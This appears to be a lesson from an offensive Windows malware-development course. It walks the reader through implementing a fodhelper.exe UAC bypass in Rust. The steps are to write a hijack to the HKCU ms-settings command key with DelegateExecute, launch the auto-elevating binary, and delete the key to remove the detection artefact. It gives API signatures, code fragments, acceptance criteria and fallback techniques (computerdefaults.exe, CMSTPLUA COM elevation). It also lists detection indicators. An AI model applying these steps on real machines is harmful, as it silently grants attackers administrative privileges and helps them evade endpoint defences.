# Module 21 — UAC Bypass

## Concept

**User Account Control (UAC)** is Windows' mechanism for preventing code from silently gaining administrative privileges. Even when you log in as an administrator, your session runs at *medium* integrity by default. To do anything that requires elevation — installing software, modifying protected registry keys, writing to `%SystemRoot%` — Windows shows a UAC prompt. You must explicitly confirm.

A **UAC bypass** tricks the system into elevating your code to *high* integrity without ever showing that prompt.

### Integrity levels

Windows assigns every process and object a mandatory integrity level (MIL). The kernel enforces that lower-integrity processes cannot write to higher-integrity objects.

| Level | RID | Typical context |
|---|---|---|
| Low | `0x1000` | Sandboxed apps (IE Protected Mode, Edge), Low-rights processes |
| Medium | `0x2000` | Normal user processes, default for admin-account shells |
| High | `0x3000` | Processes that ran through a UAC elevation prompt |
| System | `0x4000` | Windows services, kernel components, SYSTEM account |

When you open a normal `cmd.exe` or run your malware, it starts at **medium**. Many attack primitives (token manipulation, LSASS access, certain registry hives) require **high** or **system**.

### How UAC elevation normally works

When a user right-clicks a program and selects "Run as administrator", the AppInfo service creates a new process using the administrator token's high-integrity linked token. The UAC prompt is the UI for this consent step.

### Auto-elevate binaries

Certain binaries in `%SystemRoot%\System32` carry a manifest with `<autoElevate>true</autoElevate>`. When a medium-integrity process launches one of these, Windows elevates it silently — no prompt. Examples: `fodhelper.exe`, `eventvwr.exe`, `diskcleanup.exe`, `computerdefaults.exe`.

The attack strategy: make one of these auto-elevate binaries execute *your* code instead of its own.

---

## The fodhelper technique

`fodhelper.exe` (Features on Demand helper) checks the following registry key on startup to determine what app handles the `ms-settings:` URI scheme:

```
HKCU\Software\Classes\ms-settings\shell\open\command
```

The key lives in `HKCU` — writable by the current user without any elevation. When `fodhelper.exe` launches and reads this key, it executes whatever command is stored there, and it does so **at high integrity** (because fodhelper itself is auto-elevated).

The attack sequence:

1. Write your payload path to `HKCU\Software\Classes\ms-settings\shell\open\command` (default value).
2. Write an empty string to the `DelegateExecute` value in the same key (this value's presence is required to activate the COM-based handler lookup).
3. Launch `fodhelper.exe`.
4. fodhelper reads the key, executes your payload at high integrity.
5. Clean up the registry key.

---

## Task — UAC bypass via fodhelper

Implement the bypass in five steps. The skeleton in `src/main.rs` has a `todo!()` for each step.

### Step 1 — Query the current integrity level

Before the bypass, confirm you are running at medium integrity. After the bypass, the spawned cmd.exe should be at high.

```
OpenProcessToken(
    ProcessHandle: HANDLE,            // GetCurrentProcess() — current process handle
    DesiredAccess: TOKEN_ACCESS_MASK, // TOKEN_QUERY — read-only access to the token
    TokenHandle: *mut HANDLE,         // out: open handle to the process token
) -> Result<()>
```

Then call `GetTokenInformation` twice: first with a zero-length buffer to get the required size, second with an allocated buffer to get the actual data:

```
GetTokenInformation(
    TokenHandle: HANDLE,                        // token handle from OpenProcessToken
    TokenInformationClass: TOKEN_INFORMATION_CLASS, // TokenIntegrityLevel
    TokenInformation: Option<*mut c_void>,      // pointer to your buffer (None on first call)
    TokenInformationLength: u32,                // buffer size in bytes (0 on first call)
    ReturnLength: *mut u32,                     // out: required/actual byte count
) -> Result<()>
```

The buffer holds a `TOKEN_MANDATORY_LABEL`. Its `Label.Sid` field is a pointer to a SID. The integrity level RID is the last sub-authority:

```rust
// Extract RID from the integrity SID:
let count = *GetSidSubAuthorityCount(tml.Label.Sid) as u32;
let rid   = *GetSidSubAuthority(tml.Label.Sid, count - 1);
```

Match against:
- `0x1000` → Low
- `0x2000` → Medium
- `0x3000` → High
- `0x4000` → System

### Step 2 — Write the registry hijack

Create the key and set two values. The key must exist in `HKCU` before `fodhelper.exe` is launched.

```
RegCreateKeyExA(
    hKey: HKEY,                              // HKEY_CURRENT_USER
    lpSubKey: PCSTR,                         // b"Software\\Classes\\ms-settings\\shell\\open\\command\0"
    Reserved: u32,                           // 0 — always zero
    lpClass: PCSTR,                          // PCSTR::null() — no class name
    dwOptions: REG_OPEN_CREATE_OPTIONS,      // REG_OPTION_NON_VOLATILE — persist across reboots
    samDesired: REG_SAM_FLAGS,               // KEY_SET_VALUE — permission to write values
    lpSecurityAttributes: Option<*const SECURITY_ATTRIBUTES>, // None — default ACL
    phkResult: *mut HKEY,                    // out: handle to the created/opened key
    lpdwDisposition: Option<*mut REG_OPEN_CREATE_OPTIONS_VALUE>, // None — don't care
) -> WIN32_ERROR                             // ERROR_SUCCESS (0) on success
```

Then set the default value (empty string name = default):

```
RegSetValueExA(
    hKey: HKEY,          // handle from RegCreateKeyExA
    lpValueName: PCSTR,  // PCSTR::null() — the default value has no name
    Reserved: u32,       // 0
    dwType: REG_VALUE_TYPE, // REG_SZ — null-terminated UTF-16... actually ANSI in this API
    lpData: *const u8,   // pointer to your command string, e.g. b"cmd.exe\0"
    cbData: u32,         // byte count including the null terminator
) -> WIN32_ERROR
```

And the `DelegateExecute` value (required — its presence tells Windows to use the COM-based handler path):

```
RegSetValueExA(
    hKey: HKEY,
    lpValueName: PCSTR,  // PCSTR(b"DelegateExecute\0".as_ptr())
    Reserved: u32,       // 0
    dwType: REG_VALUE_TYPE, // REG_SZ
    lpData: *const u8,   // pointer to an empty string: b"\0"
    cbData: u32,         // 1 (just the null terminator)
) -> WIN32_ERROR
```

### Step 3 — Launch fodhelper.exe

```
ShellExecuteA(
    hwnd: HWND,                // HWND::default() — no parent window
    lpoperation: PCSTR,        // PCSTR(b"open\0".as_ptr()) — the verb: open/run the program
    lpfile: PCSTR,             // PCSTR(b"fodhelper.exe\0".as_ptr()) — the binary to launch
    lpparameters: PCSTR,       // PCSTR::null() — no command-line arguments
    lpdirectory: PCSTR,        // PCSTR::null() — inherit working directory
    nshowcmd: SHOW_WINDOW_CMD, // SW_SHOW — make the window visible
) -> HINSTANCE                 // integer > 32 means success; ≤ 32 is an error code
```

Note: `ShellExecuteA` returns an `HINSTANCE` used as an integer. Cast it: `hinstance.0 as usize > 32`.

### Step 4 — Wait

`fodhelper.exe` needs a moment to start up and read the registry before executing your payload. A two-second sleep is sufficient for the exercise:

```rust
std::thread::sleep(std::time::Duration::from_secs(2));
```

### Step 5 — Clean up

Leaving the registry key is a detection artefact. Remove it:

```
RegDeleteKeyA(
    hKey: HKEY,      // HKEY_CURRENT_USER
    lpSubKey: PCSTR, // b"Software\\Classes\\ms-settings\\shell\\open\\command\0"
) -> WIN32_ERROR     // ERROR_SUCCESS (0) on success
```

---

## Verifying it worked

In the spawned `cmd.exe`, run:

```
whoami /groups
```

Look for `Mandatory Label\High Mandatory Level` in the output. If you see `Medium Mandatory Level`, the bypass did not work (check the registry key was written correctly and DelegateExecute is present).

---

## Detection surface

This technique is well-known and detected by most EDR products:

- Writing to `HKCU\Software\Classes\ms-settings\...` is a high-confidence UAC bypass indicator
- Launching `fodhelper.exe` shortly after a registry write is a behavioural pattern
- Windows Defender flags this specific key path

### What's more robust

**CMSTPLUA COM elevation**: invoke `{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` (the CMSTPLUA COM object), which auto-elevates and exposes a `ShellExecute`-like interface you can use to run arbitrary commands. It doesn't require writing to the registry. Research `ICMLuaUtil` and `ElevatedCreateProcess` — not implemented in this module but useful to know.

---

## Builds on

| Module | Skill reused |
|---|---|
| 03 | Registry concepts (HKCU write) |
| 04 | `CREATE_SUSPENDED`, process control |
| 20 | Token querying — `GetTokenInformation` appears here again |

---

## Acceptance Criteria

- [ ] Step 1 prints the correct integrity level before the bypass (should be "Medium")
- [ ] The registry key and both values are written without error
- [ ] `fodhelper.exe` is launched successfully (`ShellExecuteA` return > 32)
- [ ] A `cmd.exe` window opens after the sleep
- [ ] `whoami /groups` in that window shows `High Mandatory Level`
- [ ] The registry key is deleted on cleanup
- [ ] All `WIN32_ERROR` returns are checked for `ERROR_SUCCESS`

---

## Key Types

**`HKEY`** — an open handle to a registry key, returned by `RegCreateKeyExA`.

**`TOKEN_MANDATORY_LABEL`** — contains a single `SID_AND_ATTRIBUTES` field named `Label`. The `Sid` pointer inside points to a SID whose last sub-authority is the integrity RID.

**`HINSTANCE`** — returned by `ShellExecuteA`. Despite the name, treat it as an integer: cast `hinstance.0 as usize` and check `> 32`.

**`REG_SZ`** — ANSI (8-bit) string registry value type when used with `RegSetValueExA`. The data must include the null terminator in `cbData`.

---

## Hints

- `GetSidSubAuthorityCount` returns a `*mut u8` (pointer to count). Dereference it: `let count = *GetSidSubAuthorityCount(sid);`.
- `GetSidSubAuthority` returns a `*mut u32` (pointer to the sub-authority value). Dereference the result: `let rid = *GetSidSubAuthority(sid, count as u32 - 1);`.
- If `RegDeleteKeyA` returns `ERROR_FILE_NOT_FOUND`, the key wasn't created — check step 2.
- The `DelegateExecute` value content doesn't matter; only its existence matters. An empty string (`b"\0"`, length 1) works.
- On Windows 11 (build 22H2+), fodhelper may be patched. If it doesn't work, try `computerdefaults.exe` with the same key path — the technique is identical.

---

## Submission

Paste `21-uac-bypass/src/main.rs` and ask for a review.
